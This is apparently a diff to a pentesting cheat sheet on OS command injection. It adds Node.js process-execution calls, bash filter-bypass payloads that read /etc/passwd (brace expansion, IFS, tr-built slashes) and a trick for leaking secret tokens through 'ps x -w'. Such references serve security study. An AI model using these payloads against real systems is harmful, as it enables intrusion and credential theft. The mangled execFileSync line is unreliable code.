@@ -69,6 +69,44 @@ new ScriptEngineManager()
     .eval("js code here");
 ```
 
+## Node.js
+
+```javascript
+// child_process, check https://nodejs.org/api/child_process.html
+
+// exec
+// https://nodejs.org/api/child_process.html#child_processexeccommand-options-callback
+const { exec } = require('child_process');
+exec('os command here');
+
+// execSync
+// https://nodejs.org/api/child_process.html#child_processexecsynccommand-options
+const { execSync } = require('child_process');
+execSync('os command here');
+
+// execFile
+// https://nodejs.org/api/child_process.html#child_processexecfilefile-args-options-callback
+const { execFile } = require('child_process');
+execFile('path to executable file', ['args here'], (error, stdout, stderr) => { /* ... */ });
+
+// execFileSync
+// https://nodejs.org/api/child_process.html#child_processexecfilesyncfile-args-options
+const { execFileSync } = require('child_process');
+execFileSync('path to executable fileere'], (error, stdout, stderr) => { /* ... */ });
+
+// spawn
+// https://nodejs.org/api/child_process.html#child_processspawncommand-args-options
+const { spawn } = require('child_process');
+spawn('command to run here', ['args here']);
+spawn('os command here', { shell: true });
+
+// spawnSync
+// https://nodejs.org/api/child_process.html#child_processspawnsynccommand-args-options
+const { spawnSync } = require('child_process');
+spawnSync('command to run here', ['args here']);
+spawnSync('os command here', { shell: true });
+```
+
 ## Python
 
 ```python
@@ -145,28 +183,23 @@ Open3.pipeline("os command here")
 
 # Tips
 
-## List of commands
+## Brace expansion
 
-Combine the execution of multiple commands using the operators `;`, `&`, `&&`, or `||`, and optionally terminated by one of `;`, `&`, or `\n`.
+Brace expansion is a mechanism by which arbitrary strings may be generated. Patterns to be brace expanded take the form of an optional preamble, followed by either a series of comma-separated strings or a sequence expression between a pair of braces, followed by an optional postscript. The preamble is prefixed to each string contained within the braces, and the postscript is then appended to each resulting string, expanding left to right. For instance:
 
 ```bash
-$ command1; command2
-$ command1 & command2
-$ command1 && command2
-$ command1 || command2 # only if command1 fail
-$ command1\ncommand2
+$ echo a{d,c,b}e
+ade ace abe
 ```
 
-Moreover, you can use pipelines for the same purposes:
+You can use brace expansion to create payloads:
 
 ```bash
-$ command1 | command2 
-$ command1 |& command2 
+$ {cat,/etc/passwd}
 ```
 
 References:
-- [Bash Reference Manual: 3.2.3 Pipelines](https://www.gnu.org/software/bash/manual/bash.html#Pipelines)
-- [Bash Reference Manual: 3.2.4 Lists of Commands](https://www.gnu.org/software/bash/manual/bash.html#Lists)
+- [Bash Reference Manual: 3.5.1 Brace Expansion](https://www.gnu.org/software/bash/manual/bash.html#Brace-Expansion)
 
 ## Command substitution
 
@@ -181,24 +214,6 @@ Bash performs the expansion by executing command in a subshell environment and r
 
 References:
 - [Bash Reference Manual: 3.5.4 Command Substitution](https://www.gnu.org/software/bash/manual/bash.html#Command-Substitution)
-
-## Redirections
-
-Redirect input and output before a command will be executed using the operators `>`, `>|`, `>>`, `<`, and etc.
-
-```bash
-$ ls > dirlist 2>&1
-$ cat</etc/passwd
-```
-
-Supply a single string with a newline appended using the operator `<<<`.
-
-```bash
-$ base64 -d <<< dGVzdA==
-```
-
-References:
-- [Bash Reference Manual: 3.6 Redirections](https://www.gnu.org/software/bash/manual/bash.html#Redirections)
 
 ## Characters encoding
 
@@ -236,24 +251,75 @@ References:
 - [echo man page](https://linux.die.net/man/1/echo)
 - [xxd man page](https://linux.die.net/man/1/xxd)
 
-## Shell variables
+## Leak command line arguments
 
-Bash automatically assigns default values to a number of variables, such as `HOME` or `PATH`. Some of these variables can be used to create payloads. For instance, you can use `IFS` variable as a separator (this is possible since `IFS` contains a list of characters that separate fields):
+If you have parameter injection in a cli command that has been passed sensitive parameters, such as tokens or passwords, you can try to leak the passed secret with `ps x -w`.
 
 ```bash
-$ cat$IFS/etc/passwd
-$ echo${IFS}"test"
+# you can inject arbitrary parameters to <injection here> part
+$ command --user username --token SECRET_TOKEN <injection here>
+# send the vulnerable command to background with &
+# and catch the parameters with ps x -w
+$ command --user username --token SECRET_TOKEN & ps x -w
+
+    PID TTY      STAT   TIME COMMAND
+   1337 ?        S      0:00 /usr/bin/command --user username --token SECRET_TOKEN
+   1574 ?        R      0:00 ps x -w
 ```
 
-Moreover, you can override `IFS` and use any character as a separator:
+
+This can be useful if the cli logs hide sensitive settings or sensitive data is not stored in the environment. 
+
+This can be useful if the cli logs hide sensitive data or sensitive data is not stored in the environment (for instance, Github Actions provide variable interpolation `${{...}}` for injecting secrets, and you can't give access to secrets during execution). Another case is when you have blind injection and can redirect output of `ps x -w` to a file that you have access to.
+
+## List of commands
+
+Combine the execution of multiple commands using the operators `;`, `&`, `&&`, or `||`, and optionally terminated by one of `;`, `&`, or `\n`.
 
 ```bash
-$ IFS=,;`cat<<<uname,-a`
+$ command1; command2
+$ command1 & command2
+$ command1 && command2
+$ command1 || command2 # only if command1 fail
+$ command1\ncommand2
+```
+
+Moreover, you can use pipelines for the same purposes:
+
+```bash
+$ command1 | command2 
+$ command1 |& command2 
 ```
 
 References:
-- [Bash Reference Manual: 5 Shell Variables](https://www.gnu.org/software/bash/manual/bash.html#Shell-Variables)
-- [Bash Reference Manual: 3.5.7 Word Splitting](https://www.gnu.org/software/bash/manual/bash.html#Word-Splitting)
+- [Bash Reference Manual: 3.2.3 Pipelines](https://www.gnu.org/software/bash/manual/bash.html#Pipelines)
+- [Bash Reference Manual: 3.2.4 Lists of Commands](https://www.gnu.org/software/bash/manual/bash.html#Lists)
+
+## Producing slash with tr
+
+```bash
+$ echo . | tr '!-0' '"-1'
+$ tr '!-0' '"-1' <<< .
+$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
+```
+
+## Redirections
+
+Redirect input and output before a command will be executed using the operators `>`, `>|`, `>>`, `<`, and etc.
+
+```bash
+$ ls > dirlist 2>&1
+$ cat</etc/passwd
+```
+
+Supply a single string with a newline appended using the operator `<<<`.
+
+```bash
+$ base64 -d <<< dGVzdA==
+```
+
+References:
+- [Bash Reference Manual: 3.6 Redirections](https://www.gnu.org/software/bash/manual/bash.html#Redirections)
 
 ## Shell parameter expansion
 
@@ -280,24 +346,6 @@ References:
 - [Bash Reference Manual: 3.5.3 Shell Parameter Expansion](https://www.gnu.org/software/bash/manual/bash.html#Shell-Parameter-Expansion)
 - [Bash scripting cheatsheet: Parameter expansions](https://devhints.io/bash#parameter-expansions)
 
-## Brace expansion
-
-Brace expansion is a mechanism by which arbitrary strings may be generated. Patterns to be brace expanded take the form of an optional preamble, followed by either a series of comma-separated strings or a sequence expression between a pair of braces, followed by an optional postscript. The preamble is prefixed to each string contained within the braces, and the postscript is then appended to each resulting string, expanding left to right. For instance:
-
-```bash
-$ echo a{d,c,b}e
-ade ace abe
-```
-
-You can use brace expansion to create payloads:
-
-```bash
-$ {cat,/etc/passwd}
-```
-
-References:
-- [Bash Reference Manual: 3.5.1 Brace Expansion](https://www.gnu.org/software/bash/manual/bash.html#Brace-Expansion)
-
 ## Special shell parameters
 
 There are several parameters which the shell treats specially. Some of these parameters you can use to create payloads:
@@ -311,13 +359,24 @@ $ bash -c 'echo id|$0'
 References:
 - [Bash Reference Manual: 3.4.2 Special Parameters](https://www.gnu.org/software/bash/manual/bash.html#Special-Parameters)
 
-## Producing slash with tr
+## Shell variables
+
+Bash automatically assigns default values to a number of variables, such as `HOME` or `PATH`. Some of these variables can be used to create payloads. For instance, you can use `IFS` variable as a separator (this is possible since `IFS` contains a list of characters that separate fields):
 
 ```bash
-$ echo . | tr '!-0' '"-1'
-$ tr '!-0' '"-1' <<< .
-$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
+$ cat$IFS/etc/passwd
+$ echo${IFS}"test"
 ```
+
+Moreover, you can override `IFS` and use any character as a separator:
+
+```bash
+$ IFS=,;`cat<<<uname,-a`
+```
+
+References:
+- [Bash Reference Manual: 5 Shell Variables](https://www.gnu.org/software/bash/manual/bash.html#Shell-Variables)
+- [Bash Reference Manual: 3.5.7 Word Splitting](https://www.gnu.org/software/bash/manual/bash.html#Word-Splitting)
 
 ## Tricks
 
